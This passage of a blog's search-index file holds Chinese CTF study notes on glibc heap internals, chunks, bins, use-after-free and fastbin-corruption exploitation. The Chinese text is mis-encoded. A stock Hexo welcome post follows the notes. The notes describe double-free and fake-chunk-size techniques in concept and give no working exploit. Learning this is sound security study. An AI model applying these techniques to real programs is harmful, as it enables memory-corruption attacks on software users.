        <content type="html"><![CDATA[<h1 id="Glibc-Heap">Glibc Heap<a class="post-anchor" href="#Glibc-Heap"></a></h1><ul><li>è´Ÿè´£ç»´æŠ¤åŠ¨æ€åˆ†é…å†…å­˜çš„æ•°æ®ç»“æ„ç§°ä¸º heap</li><li>libc é‡Œé¢æ¯”è¾ƒå¸¸ç”¨åˆ°çš„æ˜¯ malloc ã€free ã€realloc<ul><li>C++ é‡Œçš„ newã€deleteï¼Œåº•å±‚çš„æ“ä½œä»æ˜¯ä¸Šè¿°çš„å‡ ä¸ª</li></ul></li><li>åˆ†é…æ–°å†…å­˜ç©ºé—´ã€é‡Šæ”¾å¹¶å›æ”¶ä¸éœ€è¦çš„éƒ¨åˆ†ï¼Œåœ¨åˆ†é…å†…å­˜çš„æ—¶å€™å°½é‡é¿å…<code>ç¢ç‰‡åŒ–</code></li></ul><h2 id="Glibc-heap-å®é™…æ“ä½œæ¦‚è¿°">Glibc heap å®é™…æ“ä½œæ¦‚è¿°<a class="post-anchor" href="#Glibc-heap-å®é™…æ“ä½œæ¦‚è¿°"></a></h2><ul><li><code>glibc/malloc/malloc.c</code></li><li>è¦åšåˆ°å †å†…å­˜çš„ç®¡ç†ï¼Œéœ€è¦çŸ¥é“<ul><li>æœ‰å“ªäº›ä½ç½®çš„å †å†…å­˜æ˜¯å¯ä»¥è¢«åˆ†é…çš„</li><li>æœ‰å“ªäº›æ˜¯å› ä¸º free æ‰è€Œå¯ä»¥å›æ”¶çš„</li><li>æœ‰å“ªäº›ä½ç½®æ˜¯ä½¿ç”¨ä¸­åˆ™ä¸éœ€è¦è®°å½•ï¼Œä½¿ç”¨å®ƒä»¬çš„äººåº”è®°ä½è¿™äº›æŒ‡é’ˆ</li></ul></li><li>æ•´ä¸ª heap çš„ç»“æ„è®°å½•åœ¨ä¸€ä¸ª <code>struct malloc_state</code>ä¸­ï¼Œç§°ä¸º <code>main_arena</code></li><li><code>malloc</code> åˆ†é…çš„å †å†…å­˜ç»“æ„ä½“ç§°ä¸º chunkï¼Œä¼šæ¯”è¦æ±‚çš„å¤§å°è¦å¤§ä¸€ç‚¹ï¼Œå› ä¸ºéœ€è¦è®°å½•ä¸€äº›ç»´æŠ¤ heap ç”¨çš„é¢å¤–ä¿¡æ¯</li><li><code>arena</code> è·Ÿ heap åˆ†é…çš„å†…å­˜åˆ†å¼€å­˜æ”¾ï¼Œheap overflow æ— æ³•ç›´æ¥å»è¦†ç›–å®ƒçš„å†…å®¹</li><li>å›æ”¶çš„ chunk ç”¨ linked list è®°å½•ï¼Œç§°ä¸º bin</li><li>main_arena ä¸­æœ‰å¾ˆå¤šä¸ª binï¼Œæ¯ä¸ª bin é‡Œå­˜å‚¨çš„ chunk size ä¸åŒï¼Œç›®çš„æ˜¯è®© malloc æ—¶å¯ä»¥å°½å¿«æ‰¾åˆ°æœ€é€‚åˆå¤§å°çš„ chunk</li><li>å›æ”¶çš„ chunk ä¼šä¾æ® size æ¥å†³å®šåº”è¯¥æ”¾é‚£ä¸ª linked list</li><li><code>malloc</code> æ—¶ï¼Œä¼˜å…ˆä» bin é‡Œé¢æ‰¾å‡ºå¯ä»¥ä½¿ç”¨çš„ chunkï¼Œå¦‚æœæ‰¾ä¸åˆ°æ‰ä¼šçœŸçš„åˆ†é…æ–°çš„å†…å­˜ç»™ç¨‹åºä½¿ç”¨ã€‚åˆ†é…æ—¶å¯ä»¥å»æ‰¾åˆ°è¶³å¤Ÿå¤§çš„ chunk åªåˆ‡å‡ºéœ€è¦çš„éƒ¨åˆ†ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†å½¢æˆæ–°çš„ chunk<code>(last_remainder)</code>ã€‚</li><li>æ‰¾ä¸åˆ°å¯ç”¨ç©ºé—´æ—¶ä¼šä» top chunk åˆ†é…ï¼Œtop chunk æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„ chunkï¼Œä»£è¡¨å¯ä½¿ç”¨ä½†æœªåˆ†é…çš„å†…å­˜ï¼Œmalloc åˆ†é…æ—¶ä¼šä»é‡Œé¢åˆ‡ä¸€å°å—ä¸‹æ¥ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†é‡æ–°è®¾ä¸º top</li></ul><h2 id="Chunk">Chunk<a class="post-anchor" href="#Chunk"></a></h2><ul><li><p>å­˜æ”¾ chunk metadata çš„ chunk ç»“æ„ ï¼ˆheaderï¼‰</p></li><li><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>&#123;</span>  <span class="hljs-keyword">size_t</span> prev_size;  <span class="hljs-keyword">size_t</span> size;  malloc_chunk* fd;  malloc_chunk* bk;  malloc_chunk* fd_nextsize;  malloc_chunk* bk_nextsize;&#125;</code></pre></li><li><p>64 bit</p><ul><li><code>mem = malloc(size) -&gt; chunk=mem-16; chunksize = (size+8)#16</code></li><li>å®é™…çš„ chunk åœ°å€æ˜¯ malloc å¾—åˆ°çš„åœ°å€ -16</li><li>chunksize æ˜¯ size + 8 åå‘ä¸Šå¯¹é½è‡³ 16 çš„å€æ•°ï¼Œå› ä¸ºè¦å­˜æ”¾é¢å¤–çš„ä¿¡æ¯</li></ul></li><li><p>chunk å·²å›æ”¶ï¼ˆnot inuseï¼‰</p><pre><code class="hljs undefined">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of previous chunk, if unallocated (P clear)  |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+`head:&apos; |             Size of chunk, in bytes                     |A|0|P|  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Forward pointer to next chunk in list             |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Back pointer to previous chunk in list            |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Unused space (may be 0 bytes long)                .        .                                                               . next   .                                                               |chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+`foot:&apos; |             Size of chunk, in bytes                           |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of next chunk, in bytes                |A|0|0|        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre></li></ul><h3 id="chunk-header">chunk header<a class="post-anchor" href="#chunk-header"></a></h3><ul><li>sizeï¼šè¿™ä¸ª chunk åœ¨å†…å­˜é‡Œçš„å¤§å°ï¼Œé malloc size</li><li>fdï¼Œbkï¼šæŒ‡å‘ bin é‡Œçš„å‰ä¸€ã€åä¸€ä¸ª chunk<ul><li>ä¸€èˆ¬æ¥è¯´ bin æ˜¯ double linked list</li></ul></li><li>prev_sizeï¼šå‰ä¸€ä¸ª chunksizeï¼Œç»´æŠ¤ heap æ—¶å¯ä»¥å¾—çŸ¥ å‰ä¸€ä¸ªchunkçš„ä½ç½®</li><li>æ¦‚ç•¥æ¥è¯´ï¼Œæ¯ä¸ª chunk å¯ä»¥çœ‹åˆ°å››ä¸ªç›¸é‚»çš„ chunk<ul><li><code>chunk+size</code> å†…å­˜ç©ºé—´çš„ä¸‹ä¸€ä¸ªchunk</li><li><code>chunk - prev_size</code> å†…å­˜ç©ºé—´é‡Œçš„å‰ä¸€ä¸ª chunk</li><li><code>fd,bk</code> double linked list(bin),åœ¨å†…å­˜ä¸­ä¸ä¸€å®šæ˜¯åœ¨å‰æˆ–å</li></ul></li></ul><h3 id="size">size<a class="post-anchor" href="#size"></a></h3><ul><li>size ä½ç½® åŒ…å« chunk size å’Œ flag bits</li><li>chunk size æŠŠ size æœ€ä½ä½ 3bits å½’ 0<ul><li>fastbin &lt;= 128</li><li>Small bin &lt; 1024</li><li>Large bin</li><li>Mmap &gt;= 0x20000</li></ul></li><li>æœ€ä½ bit ä¸º prev_inuse bitï¼Œç”¨æ¥è¡¨ç¤º å‰ä¸€ä¸ª chunk æ˜¯ä¸æ˜¯åœ¨ä½¿ç”¨ä¸­<ul><li>free ä¼š ä½¿å¾—ä¸‹ä¸€ä¸ª chunk çš„ prev_inuse bit è¢«è®¾ä¸º 0</li></ul></li></ul><h3 id="Heap-æ“ä½œ">Heap æ“ä½œ<a class="post-anchor" href="#Heap-æ“ä½œ"></a></h3><ul><li>p = malloc(size)<ul><li>æ‰¾å‡ºä¸€ä¸ªå¯ç”¨çš„ chunkï¼Œæˆ–ä» top chunk åˆ‡ä¸€å—ä¸‹æ¥</li><li>å¦‚æœè¿™ä¸ª chunk æ˜¯å›æ”¶çš„ï¼Œè¦å…ˆä» bin é‡Œé¢ unlinkï¼Œå³ç§»å‡ºè¿™ä¸ª linked list</li><li>å¡«å¥½ç»“æ„ï¼Œå¹¶å›ä¼  chunk + 16</li></ul></li><li>free(p)<ul><li>æ£€æŸ¥ä¸€ä¸‹è¯¥ chunk å†…å­˜åœ°å€å‰åçš„ chunkï¼Œæ˜¯ä¸æ˜¯ not inuse</li><li>å¦‚æœæœ‰ï¼Œåˆ™è¿™äº›å›æ”¶çš„ chunk å¯ä»¥è¢«åˆå¹¶æˆä¸€å—</li><li>åˆå¹¶åçš„æ–° chunkï¼Œæ”¾è¿›å¯¹åº”çš„ bin ä¸­</li></ul></li></ul><h2 id="Exploit-use-after-free">Exploit : use after free<a class="post-anchor" href="#Exploit-use-after-free"></a></h2><ul><li>è·Ÿ chunk bin ç­‰ heap çš„å†…éƒ¨æ“ä½œæ²¡ä»€ä¹ˆå…³ç³»</li><li>è®©ç¨‹åºé‡Œæœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€å—å†…å­˜<ul><li>ä¸€å—æ˜¯ structureï¼Œå¦ä¸€å—æ˜¯ç”¨ä½œ data buffer</li><li>åˆ©ç”¨å¯¹ buffer çš„è¯»å†™ï¼Œä¿®æ”¹æˆ–æ³„æ¼ structure çš„å†…å®¹</li></ul></li></ul><h3 id="åˆ©ç”¨-Chunk-çš„å›æ”¶ç‰¹æ€§">åˆ©ç”¨ Chunk çš„å›æ”¶ç‰¹æ€§<a class="post-anchor" href="#åˆ©ç”¨-Chunk-çš„å›æ”¶ç‰¹æ€§"></a></h3><ul><li>æ‰€è°“ use after freeï¼Œæ˜¯æŒ‡ free(=p) æ‰åè¿˜ç»§ç»­ä½¿ç”¨å®ƒ<ul><li>ä¾‹ï¼šlinked list remove æ‰chunkåï¼Œå¿˜äº†æŠŠæŒ‡å‘å®ƒçš„æŒ‡é’ˆç½®0ï¼Œå¯¼è‡´ä»¥ä¸ºæ­¤ chunk è¿˜å­˜åœ¨ list ä¸­</li></ul></li><li>é‡æ–° malloc(=p) ä¸€æ ·çš„å¤§å°ï¼Œä¼šæ‹¿åˆ°æ›¾ç» free æ‰çš„ chunkï¼Œæ­¤æ—¶å°±å­˜åœ¨ä¸¤ä¸ªæŒ‡é’ˆ pã€q æŒ‡å‘åŒä¸€å— chunkï¼Œä½¿ç”¨è¿™ä¸¤ä¸ªæŒ‡é’ˆçš„æ“ä½œä¼šæ··åœ¨ä¸€èµ·<ul><li>ä¾‹ï¼šå…¶ä¸­ä¸€ä¸ªæ˜¯ C++ chunkï¼Œæœ‰ä¸ª vtable æŒ‡é’ˆç”¨æ¥æ‰¾å‡ºå®é™…çš„ functionã€‚å¦‚æœå¦ä¸€ä¸ªæ˜¯å¯å†™å…¥çš„ data bufferï¼Œå°±å¯ä»¥æ”¹æ‰ function pointer</li></ul></li><li>åªè¦å®é™…çš„ chunk size ç›¸åŒï¼Œmalloc è¦æ±‚çš„å¤§å°ä¸åŒä¹Ÿæ²¡å…³ç³»ã€‚</li><li>ä¼šæ‹¿å‡ºå“ªä¸ª chunkï¼Œå–å†³äº heap é‡Œ bin çš„è¿ä½œæ–¹å¼ï¼Œä¸ä¸€å®šæ˜¯æœ€è¿‘ free çš„é‚£ä¸€ä¸ªã€‚</li></ul><h2 id="fastbin-corruption">fastbin corruption<a class="post-anchor" href="#fastbin-corruption"></a></h2><p><strong>åŸºç¡€çŸ¥è¯†</strong></p><ul><li><code>chunk size &lt;= get_max_fast()</code> çš„ chunkï¼Œä¼šè¢«æ”¾åœ¨ä¸€ç³»åˆ—ç§°ä¸º fastbin çš„ bin é‡Œ<ul><li>64 bit æ˜¯ 128 bytesï¼Œ32bit æ˜¯ 64 bytes</li><li>global_max_fast ä¸€å¼€å§‹æ˜¯ 0</li></ul></li><li>fastbin æ˜¯ single linked listï¼Œåªä½¿ç”¨ fdï¼Œä»¥ NULL ç»“å°¾</li><li>chunk size ä» 32 å¼€å§‹ï¼Œå…± 7 ä¸ªå¯ç”¨çš„ fastbin</li><li>free æ—¶ä¸å–æ¶ˆä¸‹ä¸ª chunk çš„ prev_inuse bitï¼Œå› ä¸º fastbin chunk ä¸ä¼šä¸å…¶ä»– chunk åˆå¹¶</li><li>mallocã€free æ“ä½œæ—¶ glibc ä¼šæœ‰ä¸€äº›æ£€æŸ¥ï¼Œç¡®è®¤ heap metadata æ˜¯å¦æ­£ç¡®ï¼Œé¿å…ä¸€äº›å¯èƒ½çš„æ”»å‡»æ–¹å¼</li><li>ä¸ºäº†æ‰§è¡Œæ•ˆç‡ï¼Œfastbin é‡Œçš„æ£€æŸ¥æ¯”å…¶ä»–ç±»å‹çš„ bin å°‘å¾ˆå¤š</li></ul><p><strong>åˆ©ç”¨æ–¹å¼</strong></p><ul><li>è®© fastbin linked list æŒ‡å‘ä»»æ„åœ°å€ï¼Œä¹‹å malloc æ—¶å°±ä¼šå°†è¯¥åœ°å€ä½œä¸º chunk æ‹¿å‡ºæ¥</li><li>freed(not inuse) chunk æ‰ä¼šå­˜åœ¨ bin é‡Œï¼Œä¿®æ”¹å®ƒçš„ fd æ‰ä¼šé€ æˆ corruption<ul><li>double free</li><li>overflow</li></ul></li></ul><pre><code class="hljs python">fastbin[0] ---&gt; chunk1   +---&gt; chunk2   +---&gt; chunk3  fd --+         fd --+         fd ---&gt; NULL..........&gt; arbitrary address</code></pre><h3 id="Fastbin-sanity-check">Fastbin sanity check<a class="post-anchor" href="#Fastbin-sanity-check"></a></h3><ul><li>malloc ä» bin é‡Œå–å‡ºæ—¶ï¼Œè¦ä»æ­£ç¡®çš„ bin é‡Œæ‹¿å‡ºæ¥ï¼Œå³ chunk size è¦æ­£ç¡®</li><li>free æ—¶ï¼Œnextchunk çš„ size è¦å¯¹</li><li>free æ—¶ä¼šæ£€æŸ¥ bin é‡Œç¬¬ä¸€ä¸ª chunk æ˜¯ä¸æ˜¯è·Ÿç°åœ¨ free çš„ chunk æ˜¯åŒä¸€ä¸ªï¼ˆfasttopï¼‰</li><li>fasttop åªæ£€æŸ¥ bin é‡Œç¬¬ä¸€ä¸ª chunkï¼Œåªè¦ä¸æ˜¯è¿ç»­ free åŒä¸€ä¸ª chunk å°±æ²¡å…³ç³»<ul><li><code>free(p);free(q);free(p)</code></li></ul></li><li>Double free é€ æˆç±»ä¼¼ use after free çš„æ•ˆæœï¼Œå¯ä»¥æ”¹æ‰è¿˜åœ¨ bin é‡Œçš„ chunk fd çš„å€¼<ul><li>bin æ˜¯ç”± fd ä¸²èµ·æ¥çš„ linked listï¼Œæ”¹æ‰ fd å¯ä»¥è®© linked list æ¥å¾€ä»»æ„åœ°å€</li><li>å¤šæ¬¡ malloc åï¼Œå°±ä¼šæ‹¿åˆ°ä¸€ä¸ªåœ°å€å¯æ§åˆ¶çš„ chunk</li></ul></li><li>å–å‡ºçš„ chunk å…¶ size è¦æ­£ç¡®ï¼Œæ‰€ä»¥å¹¶éæ˜¯å®Œå…¨ä»»æ„åœ°å€ï¼Œè¦èƒ½æ„é€ å‡çš„ size<ul><li>ç”¨ stack ä¸Šçš„å˜é‡å½“ä½œ sizeï¼Œå¯ä»¥ malloc å‡ºä¸€ä¸ª stack ä¸Šçš„åœ°å€</li><li>GOTä¸Šï¼Œç”¨ 64 bit åœ°å€å¸¸è§çš„ 0x40 å½“ä½œ size</li></ul></li><li>å–å¾— chunk åï¼Œç”±æœºä¼šå¯¹è¯¥åœ°å€ä»»æ„è¯»å†™</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2018/10/10/hello-world/"/>
      <url>/2018/10/10/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start">Quick Start<a class="post-anchor" href="#Quick-Start"></a></h2><h3 id="Create-a-new-post">Create a new post<a class="post-anchor" href="#Create-a-new-post"></a></h3><pre><code class="hljs bash">$ hexo new <span class="hljs-string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server">Run server<a class="post-anchor" href="#Run-server"></a></h3><pre><code class="hljs bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files">Generate static files<a class="post-anchor" href="#Generate-static-files"></a></h3><pre><code class="hljs bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy to remote sites<a class="post-anchor" href="#Deploy-to-remote-sites"></a></h3><pre><code class="hljs bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
